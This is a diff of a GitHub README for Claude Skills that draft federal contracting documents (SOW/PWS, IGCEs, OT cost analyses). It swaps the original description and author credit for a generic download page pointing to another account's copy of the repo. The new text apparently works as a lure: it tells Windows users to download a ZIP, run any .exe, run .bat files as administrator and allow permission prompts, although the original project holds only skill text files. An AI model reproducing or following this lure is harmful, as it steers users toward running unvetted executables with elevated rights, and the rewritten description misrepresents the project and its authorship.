@@ -1,66 +1,166 @@
-# 1102tools Claude Skills
+# 🏛️ federal-contracting-skills - Federal Contract Tools Made Simple
 
-Claude Skills for federal acquisition deliverables: SOW / PWS, IGCEs, OT project descriptions, OT cost analyses. Six orchestration skills that handle scope decisions, cost buildup, FAR citations, and document generation.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Aballa6975/federal-contracting-skills)
 
-Website: [1102tools.com](https://1102tools.com)
+## 📥 Download
 
-![Architecture diagram showing how each instrument chains scope, pricing, and data sources. FAR contracts: SOW/PWS Builder feeds three IGCE Builders (FFP, LH/T&M, Cost-Reimbursement) pulling from BLS OEWS, GSA CALC+, and GSA Per Diem. Other Transactions: OT Project Description Builder feeds OT Cost Analysis pulling from the same three data sources.](docs/architecture-v6.png)
+Use the link below to visit the project page and download the files:
 
-**Before you build:** Not every acquisition capability should be an AI tool. Dozens of potential skills were evaluated and several were intentionally excluded because they cross the line from data assembly into professional judgment. See **[ai-boundaries.md](ai-boundaries.md)**.
+[Open the GitHub page](https://github.com/Aballa6975/federal-contracting-skills)
 
-## Companion repo: MCPs for API data
+## 🚀 What this project does
 
-For federal API data (SAM.gov, BLS wages, GSA CALC+ rates, GSA Per Diem, USASpending, eCFR, Federal Register, Regulations.gov), use the companion repo:
+federal-contracting-skills helps with common federal contracting work. It gives you tools for:
 
-**[federal-contracting-mcps](https://github.com/1102tools/federal-contracting-mcps)** — eight MCP servers packaged as Claude Desktop Extensions (`.mcpb`). One-click install. No Terminal. No JSON config editing. API keys prompted at install time.
+- IGCE building for FFP, T&M, and cost-reimbursement work
+- SOW and PWS drafting
+- Market research reports
+- Live lookups from key federal data sources
+- Support for GS-1102 contract specialists and small businesses
 
-The two repos work together: MCPs handle data, skills handle deliverables.
+It is built to help you move from a blank page to a working draft faster.
 
-## Why the split
+## 🖥️ What you need
 
-The five API data-source skills (BLS OEWS, GSA CALC+, GSA Per Diem, SAM.gov, USASpending) were removed from this repo in April 2026. They moved to the MCP companion repo.
+Use a Windows computer with:
 
-**Reasons:**
+- Windows 10 or Windows 11
+- An internet connection
+- A web browser such as Edge or Chrome
+- At least 4 GB of RAM
+- 500 MB of free disk space
 
-1. **Deterministic tool calls.** MCP servers execute tested Python code. Claude does not generate API-call code on the fly. Skills drifted across runs; MCPs do not. Same input, same output.
-2. **One-click install for Claude Desktop.** `.mcpb` bundles prompt for API keys at install time and register tools automatically. Contracting officers install them the same way they install any app.
-3. **Less context cost.** Tool schemas are ~100 tokens each. The old API skills cost 500-1000 lines of context per run.
-4. **Production-hardened.** Each MCP went through 3-6 audit rounds with live testing against the production API. Roughly 350 bugs fixed during hardening across the eight MCPs.
-5. **Cross-client support.** MCP is an open standard. Same servers run in Claude Desktop, Claude Code, Cursor, Cline, Zed, Continue.
+For best results, use a newer system with a stable internet connection.
 
-The orchestration skills in this repo stay as skills. Their value is decision trees, FAR-compliant narrative, and document generation, not API calls.
+## 📦 What you get
 
-## The orchestration skills
+This project includes tools for:
 
-### FAR contracts
+- **IGCE builders**  
+  Create cost estimates for fixed-price, time-and-materials, and cost-reimbursement actions
 
-| Skill | Requires | Description |
-|-------|----------|-------------|
-| [SOW/PWS Builder](skills/sow-pws-builder) | — | Structured scope decision tree producing contract-file-ready SOW or PWS. FAR 37.102(d) compliant: staffing handoff for the IGCE Builder delivered as chat output, never embedded in the document body. |
-| [IGCE Builder: FFP](skills/igce-builder-ffp) | BLS OEWS, GSA CALC+, GSA Per Diem MCPs | Firm-fixed-price IGCEs with layered wrap rate buildup (fringe, overhead, G&A, profit). |
-| [IGCE Builder: LH/T&M](skills/igce-builder-lh-tm) | BLS OEWS, GSA CALC+, GSA Per Diem MCPs | Labor Hour and Time-and-Materials IGCEs with burden multiplier pricing. |
-| [IGCE Builder: Cost-Reimbursement](skills/igce-builder-cr) | BLS OEWS, GSA CALC+, GSA Per Diem MCPs | CPFF, CPAF, CPIF IGCEs with fee structure analysis and statutory fee caps. |
+- **SOW and PWS generator**  
+  Draft work statements and performance work statements with a clear structure
 
-### Other Transactions (OT)
+- **Market research reports**  
+  Pull together key facts for planning and acquisition files
 
-| Skill | Requires | Description |
-|-------|----------|-------------|
-| [OT Project Description Builder](skills/ot-project-description-builder) | — | Milestone-based project descriptions for prototype OT agreements under 10 USC 4021/4022. Replaces the SOW/PWS for OTs: structures work around TRL progression phases and go/no-go gates. Handles NDC, small business, traditional (with cost sharing), and consortium-brokered agreements. |
-| [OT Cost Analysis](skills/ot-cost-analysis) | BLS OEWS, GSA CALC+, GSA Per Diem MCPs | Should-cost estimates and price reasonableness analyses for OT agreements. Milestone-based pricing citing 10 USC 4021 instead of FAR 15.404. Handles cost-sharing math, consortium management fees, fixed-price and cost-type milestone payments. |
+- **Live API tools**  
+  Work with current data from:
+  - USASpending
+  - GSA CALC+
+  - BLS OEWS
+  - Per Diem
+  - Federal Register
+  - eCFR
+  - Regulations.gov
 
-"Requires" lists the MCP servers each skill calls at runtime. Install them from the companion repo.
+- **Federal contracting support**  
+  Use tools built around FAR-related tasks and acquisition work
 
-## Install
+## 🔧 How to download and open it
 
-1. Install [Claude Desktop](https://claude.ai/download).
-2. Install the MCPs you need from [federal-contracting-mcps](https://github.com/1102tools/federal-contracting-mcps) (one-click, `.mcpb` files).
-3. Download a skill folder from this repo. In Claude Desktop: **Customize > Skills > + > Create skill > Upload a skill**. Drag in each `SKILL.md` file individually.
-4. Ask naturally. The skill reads its instructions and calls the MCP tools.
+1. Open this page: [https://github.com/Aballa6975/federal-contracting-skills](https://github.com/Aballa6975/federal-contracting-skills)
+2. On the GitHub page, look for the **Code** button
+3. Click **Code**
+4. Choose **Download ZIP**
+5. Save the file to your computer
+6. Right-click the ZIP file and choose **Extract All**
+7. Open the extracted folder
+8. Look for the main app file, script, or instructions file in the folder
+9. Open the file or follow the included setup steps
 
-## License
+If the project includes a Windows app file, you can run it after download. If it includes scripts or setup files, use the included instructions in the folder.
 
-MIT
+## 🪟 Windows setup
 
-## Author
+After you extract the files:
 
-Built by [James Jenrette](https://www.linkedin.com/in/jamesjenrette/), lead systems analyst and contracting officer. Independently developed and not endorsed by any federal agency.
+1. Open the folder you downloaded
+2. Read any file named `README`, `INSTALL`, or `SETUP`
+3. If there is an `.exe` file, double-click it to start the app
+4. If there is a `.bat` file, right-click it and choose **Run as administrator** if the instructions say so
+5. If the app opens in a browser, keep the window open while you work
+6. If Windows asks for permission, choose **Allow** only if you want to start the app
+
+If the project uses a local setup, keep the folder in a place you will not move or rename.
+
+## 🧭 How to use it
+
+Start with the tool that matches your task:
+
+- Use the **IGCE builder** when you need a cost estimate
+- Use the **SOW/PWS generator** when you need draft contract language
+- Use the **market research tools** when you need source data and references
+- Use the **live API tools** when you want current public data for a file or report
+
+A simple workflow is:
+
+1. Pick a tool
+2. Enter the contract or project details
+3. Review the draft output
+4. Edit the text for your file
+5. Save or copy the result
+
+## 📊 Data sources
+
+The project works with public federal sources and reference tools. These may include:
+
+- USASpending for award and spending data
+- GSA CALC+ for labor rate support
+- BLS OEWS for wage data
+- Per Diem rates for travel support
+- Federal Register for rule and notice research
+- eCFR for current regulation text
+- Regulations.gov for public comments and docket info
+
+These sources help with planning, research, and file support.
+
+## 🧩 Typical use cases
+
+This project can help with:
+
+- Building an IGCE for a new buy
+- Drafting a PWS for service work
+- Drafting an SOW for a task order
+- Preparing market research notes
+- Checking labor rates and wage data
+- Looking up current federal notices
+- Gathering source data for a contract file
+
+## 🗂️ Suggested folder setup
+
+If you keep this project on your PC, use a simple folder path such as:
+
+- `C:\Federal-Contracting-Skills`
+
+This keeps the files easy to find and reduces path issues.
+
+## ❓ If something does not open
+
+Try these steps:
+
+1. Make sure the ZIP file was fully extracted
+2. Check that you opened the right folder
+3. Look for a setup or launch file
+4. Make sure your browser is up to date
+5. Check that Windows did not block the file
+6. Re-download the ZIP if the file looks broken
+
+If you still cannot start it, open the GitHub page and review the project files for the correct launch step
+
+## 🔍 Repository details
+
+- **Repository name:** federal-contracting-skills
+- **Description:** Free Claude Skills for federal contracting
+- **Topics:** 1102, acquisition, ai-tools, claude-ai, claude-skills, cost-estimate, far, federal-acquisition, federal-contracting, government, government-contracting, gsa, igce, market-research, open-source, procurement, pws, small-business, sow, usaspending
+
+## 📌 Best fit for
+
+This project is a fit for:
+
+- GS-1102 contract specialists
+- Small businesses that work with the federal government
+- Procurement staff
+- Acquisition teams
+- Users who need faster first drafts for contract work
